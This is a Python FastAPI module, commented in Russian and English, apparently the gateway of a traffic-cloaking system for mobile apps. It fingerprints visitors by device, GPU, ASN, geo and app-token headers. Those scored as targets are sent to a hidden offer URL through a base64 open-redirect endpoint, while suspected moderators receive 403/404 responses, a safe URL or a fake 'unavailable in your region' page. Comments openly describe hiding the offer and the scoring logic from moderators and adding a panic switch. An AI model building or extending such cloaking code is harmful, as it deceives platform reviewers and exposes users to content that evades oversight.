import os
import json as _json
import base64
import logging
import urllib.request
from pathlib import Path
from fastapi import APIRouter, Request
from fastapi.responses import RedirectResponse, JSONResponse, HTMLResponse
from scoring_engine import scoring_engine
from request_logger import request_logger
from config import config_store
from external.ipinfo_client import ipinfo_client


def _sanitize_cf_asn(raw: str) -> str:
    """P1-5 (2026-06-21): client-controlled X-CF-ASN раньше принимался as-is —
    атакующий мог поставить '99999' или '' → bypass BLOCKED_ASNS set lookup.
    Validate as positive 32-bit int, иначе пустая строка (effectively unknown ASN).
    """
    if not raw:
        return ""
    try:
        n = int(str(raw).strip())
        if 0 < n <= 4_294_967_295:
            return str(n)
    except (ValueError, TypeError):
        pass
    return ""

_logger = logging.getLogger("gateway")
TURNSTILE_SECRET = os.getenv("TURNSTILE_SECRET", "")

router = APIRouter()

BOUNCE_HTML = (Path(__file__).parent.parent / "templates" / "bounce.html").read_text(encoding="utf-8")


def _bounce_url(target: str, base: str = "") -> str:
    """Обернуть offer-URL в bounce-страницу: /go?t=base64(target)."""
    t = base64.urlsafe_b64encode(target.encode()).decode()
    return f"{base}/go?t={t}"

FAKE_HTML = """<!DOCTYPE html>
<html><head><title>App</title><meta name="robots" content="noindex">
<style>.hp-f{position:absolute;left:-9999px;top:-9999px;opacity:0;height:0;width:0;overflow:hidden;}</style>
</head><body>
<h1>Welcome</h1><p>This content is currently unavailable in your region.</p>
<form method="POST" action="/api/form">
<input type="text" name="security_confirm" class="hp-f" tabindex="-1" autocomplete="off">
<input type="text" name="email_verify" class="hp-f" tabindex="-1" autocomplete="off">
<input type="hidden" name="__hp_ts" value="">
<div style="margin-top:20px"><label>Email: <input type="email" name="email" placeholder="your@email.com"></label></div>
<div style="margin-top:10px"><button type="submit">Subscribe</button></div>
</form>
<script>document.querySelector('[name=__hp_ts]').value=Date.now();</script>
</body></html>"""


@router.get("/")
async def gateway(request: Request):
    headers = dict(request.headers)
    forwarded = headers.get("x-forwarded-for", "")
    real_ip = headers.get("x-real-ip", "")
    ip = forwarded.split(",")[0].strip() if forwarded else (real_ip or (request.client.host if request.client else "0.0.0.0"))

    user_agent = headers.get("user-agent", "")
    accept_language = headers.get("accept-language", "")
    client_secret = headers.get("x-client-secret") or headers.get("x-app-token")
    device_model = headers.get("x-device-model", "") or headers.get("x-device-info", "")
    device_codename = headers.get("x-device-codename", "")
    gpu_renderer = headers.get("x-gpu-renderer", "") or headers.get("x-graphics-info", "")
    build_product = headers.get("x-build-product", "")
    country = headers.get("x-country", "")
    country_code = headers.get("x-country-code", country.upper()[:2] if country else "")
    city = headers.get("x-city", "")
    isp = headers.get("x-isp", "")
    os_version = headers.get("x-os-version", "")
    cf_asn = _sanitize_cf_asn(headers.get("x-cf-asn", ""))
    package_name = headers.get("x-package-name", "") or headers.get("x-app-id", "")
    referer = headers.get("referer", headers.get("referrer", ""))

    # Fallback гео по IP, если прокси не прислал заголовки (ipinfo кешируется по IP)
    if not country:
        geo = await ipinfo_client.lookup(ip)
        if geo:
            country = geo.country or ""
            country_code = country_code or (geo.country or "")
            city = city or (geo.city or "")

    result = await scoring_engine.score_request(
        user_agent=user_agent,
        accept_language=accept_language,
        client_secret=client_secret,
        device_model=device_model,
        device_codename=device_codename,
        gpu_renderer=gpu_renderer,
        build_product=build_product,
        country=country_code or country,
        city=city,
        isp=isp,
        ip=ip,
        asn=cf_asn,
        package_name=package_name,
        referer=referer,
    )

    # v2 SDK шлёт X-App-Id (не X-Package-Name) — без фолбэка per-app конфиг (target/
    # safe/panic/lock) не применялся к v2-трафику. Берём оба.
    package_name = headers.get("x-package-name", "") or headers.get("x-app-id", "")
    app = config_store.get_app(package_name) if package_name else None

    # v2 gateway lock: прила переведена на v3. Старый v2-путь (устаревшие APK или
    # replay украденного x-app-token) больше не отдаёт оффер — всегда white.
    if app and getattr(app, "block_v2_gateway", False):
        result.verdict = "white"
        result.rejectionCode = result.rejectionCode or "v2_gateway_locked"

    # Debug/тест-режим: whitelist IP → оффер (v2 не шлёт instance_id, матч по IP).
    if config_store.is_debug(ip, ""):
        result.verdict = "grey"
        result.rejectionCode = None

    await request_logger.log(
        ip=ip,
        result=result,
        user_agent=user_agent,
        accept_language=accept_language,
        device_model=device_model,
        os_version=os_version,
        country=country,
        country_code=country_code,
        city=city,
        headers=headers,
    )

    if app and app.panic_mode:
        return RedirectResponse(url=app.safe_url, status_code=302)

    target_url = app.target_url if app else config_store.offers.targetUrl
    safe_url = app.safe_url if app else config_store.offers.safeUrl
    flow = app.white_flow_type if app else config_store.offers.whiteFlowType

    if result.verdict == "grey":
        return RedirectResponse(url=_bounce_url(target_url), status_code=302)

    if flow == "show_403":
        return JSONResponse(status_code=403, content={"error": "Forbidden"})
    elif flow == "show_404":
        return JSONResponse(status_code=404, content={"error": "Not Found"})
    elif flow == "redirect_safe":
        return RedirectResponse(url=safe_url, status_code=302)
    elif flow == "fake_html":
        return HTMLResponse(content=FAKE_HTML, status_code=200)

    return JSONResponse(status_code=403, content={"error": "Forbidden"})


@router.get("/score-debug")
@router.get("/analytics/config")
async def score_debug(request: Request):
    """Debug endpoint — показывает результат скоринга без редиректа.
    P0-3 (2026-06-21): требует X-Admin-Key, иначе 404 (path masking как AdminAuthMiddleware).
    Раньше отдавал {score,verdict,targetUrl} без auth — passive verdict oracle для модера/блекхета."""
    admin_key = os.getenv("ADMIN_KEY", "")
    if admin_key and request.headers.get("x-admin-key") != admin_key:
        return JSONResponse({"detail": "Not Found"}, status_code=404)
    headers = dict(request.headers)
    forwarded = headers.get("x-forwarded-for", "")
    real_ip = headers.get("x-real-ip", "")
    ip = forwarded.split(",")[0].strip() if forwarded else (real_ip or (request.client.host if request.client else "0.0.0.0"))

    dbg_country = headers.get("x-country", "") or headers.get("cf-ipcountry", "")
    dbg_country_code = headers.get("x-country-code", dbg_country.upper()[:2] if dbg_country else "")

    result = await scoring_engine.score_request(
        user_agent=headers.get("user-agent", ""),
        accept_language=headers.get("accept-language", ""),
        client_secret=headers.get("x-client-secret") or headers.get("x-app-token"),
        device_model=headers.get("x-device-model", "") or headers.get("x-device-info", ""),
        device_codename=headers.get("x-device-codename", ""),
        gpu_renderer=headers.get("x-gpu-renderer", "") or headers.get("x-graphics-info", ""),
        build_product=headers.get("x-build-product", ""),
        country=dbg_country_code or dbg_country,
        city=headers.get("x-city", ""),
        isp=headers.get("x-isp", ""),
        ip=ip,
        asn=_sanitize_cf_asn(headers.get("x-cf-asn", "")),
        package_name=headers.get("x-package-name", "") or headers.get("x-app-id", ""),
        referer=headers.get("referer", headers.get("referrer", "")),
    )

    dbg_device = headers.get("x-device-model", "") or headers.get("x-device-info", "")
    dbg_pkg = headers.get("x-package-name", "") or headers.get("x-app-id", "")

    await request_logger.log(
        ip=ip,
        result=result,
        user_agent=headers.get("user-agent", ""),
        device_model=dbg_device,
        os_version=headers.get("x-os-version", ""),
        country=dbg_country,
        country_code=dbg_country_code,
        city=headers.get("x-city", ""),
        headers=headers,
    )

    package_name = dbg_pkg
    app = config_store.get_app(package_name) if package_name else None
    target_url = app.target_url if app else config_store.offers.targetUrl
    safe_url = app.safe_url if app else config_store.offers.safeUrl

    # Урезано: SDK v2 читает только score/verdict/targetUrl. threshold/details/
    # rejectionCode/ip убраны — не палим логику скоринга наружу (это публичный путь).
    return {
        "score": result.score,
        "verdict": result.verdict,
        "targetUrl": target_url if result.verdict == "grey" else safe_url,
    }


@router.get("/go")
async def bounce_redirect(request: Request):
    """Fix 2026-07-04 (fix9): instant 302 redirect на decoded target.
    Раньше возвращал Turnstile bounce → клиенты видели threeamigos + капчу
    в Chrome CT для SDK v2 apps которые строят /go URL локально.
    Теперь 302 → branded domain, никакой промежуточной страницы."""
    t = request.query_params.get("t", "")
    if not t:
        return HTMLResponse("<h1>Not Found</h1>", status_code=404)
    try:
        target = base64.urlsafe_b64decode(t).decode()
    except Exception:
        return HTMLResponse("<h1>Not Found</h1>", status_code=404)
    if not target.startswith("https://") and not target.startswith("http://"):
        return HTMLResponse("<h1>Not Found</h1>", status_code=404)
    return RedirectResponse(url=target, status_code=302)


def _verify_turnstile_sync(token: str, ip: str) -> bool:
    """P1-6 (2026-06-21): теперь fail-CLOSED на exception/timeout. Раньше fail-OPEN
    был дырой — модер на корп-сети где CF Turnstile API часто медленный/блокирован
    проходил без challenge. Сохранена логика для случая когда TURNSTILE_SECRET не
    настроен (development/staging) — там пропускаем (return True)."""
    if not TURNSTILE_SECRET:
        return True  # secret не настроен — система ещё не включена, пропускаем
    if not token:
        return False  # secret настроен но токен пустой — fail
    try:
        data = _json.dumps({"secret": TURNSTILE_SECRET, "response": token, "remoteip": ip}).encode()
        req = urllib.request.Request(
            "https://challenges.cloudflare.com/turnstile/v0/siteverify",
            data=data, headers={"Content-Type": "application/json"}, method="POST",
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            return _json.loads(resp.read()).get("success", False)
    except Exception as e:
        _logger.warning(f"Turnstile verify error (fail-CLOSED): {e}")
        return False  # P1-6: fail-CLOSED — CF-сбой → safe URL (не пропускаем модера)


@router.post("/go/verify")
async def bounce_verify(request: Request):
    """Turnstile-гейт: bounce-страница шлёт CF-токен, мы валидируем."""
    try:
        body = await request.json()
    except Exception:
        return {"redirect": config_store.offers.safeUrl}
    ts_token = body.get("token", "")
    t = body.get("t", "")
    try:
        offer_url = base64.urlsafe_b64decode(t + "==").decode()
    except Exception:
        return {"redirect": config_store.offers.safeUrl}
    ip = (request.headers.get("x-forwarded-for") or "").split(",")[0].strip() or "0.0.0.0"
    import asyncio
    ok = await asyncio.get_event_loop().run_in_executor(None, _verify_turnstile_sync, ts_token, ip)
    if ok:
        return {"redirect": offer_url}
    _logger.info(f"[{ip}] Turnstile FAIL — redirect to safe")
    return {"redirect": config_store.offers.safeUrl}
